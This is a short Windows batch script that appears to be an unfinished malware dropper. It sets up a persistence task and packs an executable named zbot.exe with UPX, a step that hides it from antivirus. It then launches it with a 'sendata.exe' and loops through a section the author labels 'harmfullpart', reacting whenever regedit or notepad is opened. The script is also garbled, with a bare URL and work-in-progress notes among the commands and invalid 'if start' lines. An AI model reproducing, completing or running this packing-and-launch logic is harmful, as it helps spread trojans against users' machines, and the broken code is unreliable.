@echo off
start persistentask.bat
ping localhost >> data.txt
www.upx.sourceforge.net/#downloadupx <-- Working here...
xcopy %userprofile%/Downloads/ <-- Working here...
upx zbot.exe -o zbot_upx.exe
start zbot_upx.exe
start sendata.exe
start secondmain.bat
goto harmfullpart
:harmfullpart
if start regedit.exe goto regedit
if start notepad.exe goto notepad
goto harmfullpart
:regedit
start reg.bat
goto harmfullpart
:notepad
start text.bat
goto harmfullpart
